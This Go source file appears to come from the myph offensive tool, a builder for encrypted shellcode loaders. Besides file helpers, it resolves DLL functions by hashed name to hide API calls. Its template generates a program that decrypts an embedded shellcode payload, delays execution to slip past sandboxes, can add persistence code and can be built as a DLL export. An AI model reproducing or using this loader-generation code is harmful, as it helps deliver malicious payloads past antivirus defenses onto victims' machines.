package tools

import (
	"bytes"
	"fmt"
	"io"
	"math/rand"
	"os"

	"github.com/Binject/debug/pe"
	"github.com/cmepw/myph/internals"
)

func MoveFile(sourcePath, destPath string) error {
	inputFile, err := os.Open(sourcePath)
	if err != nil {
		return fmt.Errorf("Couldn't open source file: %s", err)
	}
	outputFile, err := os.Create(destPath)
	if err != nil {
		inputFile.Close()
		return fmt.Errorf("Couldn't open dest file: %s", err)
	}
	defer outputFile.Close()
	_, err = io.Copy(outputFile, inputFile)
	inputFile.Close()
	if err != nil {
		return fmt.Errorf("Writing to output file failed: %s", err)
	}
	// The copy was successful, so now delete the original file
	err = os.Remove(sourcePath)
	if err != nil {
		return fmt.Errorf("Failed removing original file: %s", err)
	}
	return nil
}

func WriteToFile(outfile string, filname string, toWrite string) error {

	full_path := fmt.Sprintf("%s/%s", outfile, filname)
	file, err := os.OpenFile(full_path, os.O_TRUNC|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}

	file.WriteString(toWrite)
	file.Close()
	return nil
}

func RandomString(n int) string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	s := make([]rune, n)
	for i := range s {
		s[i] = letters[rand.Intn(len(letters))]
	}
	return string(s)
}

func ReadFile(filepath string) ([]byte, error) {
	buf := bytes.NewBuffer(nil)
	f, err := os.Open(filepath)
	if err != nil {
		return []byte{}, err
	}

	io.Copy(buf, f)
	f.Close()

	return buf.Bytes(), nil
}

func DirExists(dir string) (bool, error) {
	_, err := os.Stat(dir)
	if err == nil {
		return true, nil
	}

	if os.IsNotExist(err) {
		return false, nil
	}
	return false, err
}

func CreateTmpProjectRoot(path string, persist string) error {

	fmt.Printf("[+] Initializing temporary build directory\n")

	/*
	   create a directory with the path name
	   defined by the options
	*/

	exists, err := DirExists(path)
	if err != nil {
		return err
	}

	if exists {
		fmt.Printf("[!] %s already exists...Removing\n", path)
		os.RemoveAll(path)
	}

	err = os.MkdirAll(path, 0777)
	if err != nil {
		return err
	}

	var go_mod = []byte(`
module whatever

go 1.19

    `)

	gomod_path := fmt.Sprintf("%s/go.mod", path)
	fo, err := os.Create(gomod_path)
	fo.Write(go_mod)

	maingo_path := fmt.Sprintf("%s/main.go", path)
	_, _ = os.Create(maingo_path)

	execgo_path := fmt.Sprintf("%s/exec.go", path)
	_, _ = os.Create(execgo_path)

	encryptgo_path := fmt.Sprintf("%s/encrypt.go", path)
	_, _ = os.Create(encryptgo_path)

	if persist != "" {
		encryptgo_path := fmt.Sprintf("%s/persist.go", path)
		_, _ = os.Create(encryptgo_path)
	}

	println("\n")
	return nil
}

func FindAndExecute(
	hashing_algorithm func(string) string,
	functionName string,
	dllName string,
) error {

	hashedName := hashing_algorithm(functionName)
	dll, err := pe.Open(dllName)
	if err != nil {
		return err
	}

	ptr, err := internals.LoadFunctionFromHash(hashing_algorithm, hashedName, dll)
	if err != nil {
		return err
	}

	fmt.Print(ptr)
	return nil
}

func GetMainTemplate(
	encoding string,
	key string,
	sc string,
	sleepTime uint,
	persistData string,
	shouldExport bool,
) string {

	/* if hex encoding is used, it does not require to go through StdEncoding */
	encCall := "enc.StdEncoding"
	if encoding == "hex" {
		encCall = "enc"
	}
	exportImpStr := `import "C"`
	exportexpStr := `
func main() {}
//export entry
func entry() {`
	if !shouldExport {
		exportImpStr = ""
		exportexpStr = "func main() {"
	}
	return fmt.Sprintf(`
package main

import (
    "time"
    "os"
    enc "encoding/%s"
)

%s
var Key = %s
var Code = %s
%s

    decodedSc, _ := %s.DecodeString(Code)
    decodedKey, _ := %s.DecodeString(Key)

    decrypted, err := Decrypt(decodedSc, decodedKey)
    if err != nil {
        os.Exit(1)
    }

    time.Sleep(%d * time.Second)

	  %s
    ExecuteOrderSixtySix(decrypted)
}
    `, encoding, exportImpStr, key, sc, exportexpStr, encCall, encCall, sleepTime, persistData)
}
